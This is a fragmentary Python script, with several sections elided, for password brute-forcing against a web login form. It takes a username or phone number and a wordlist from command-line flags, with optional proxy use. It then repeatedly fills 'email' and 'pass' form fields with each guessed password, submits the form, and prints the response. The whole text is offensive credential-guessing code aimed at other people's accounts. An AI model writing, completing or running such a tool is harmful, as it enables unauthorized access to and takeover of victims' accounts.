...
Example : %s -u 1234567890 -w wordlist.txt"
...
for arg in sys.argv:
    try:
        if arg.lower() == '-u' or arg.lower() == '--username':
        ...
        elif arg.lower() == '-k' or arg.lower() == '--usernameproxy':
            usepassproxy = True
...
def bruteforce(word):
    try:
        ...
        br.select_form(nr=0)
        br.form['email'] = username  # Submit the phone number as the 'email' field
        br.form['pass'] = word
        br.submit()
        response = br.response().read().decode('utf-8')  # Decode bytes to a string
        if verbose:
            print(response)
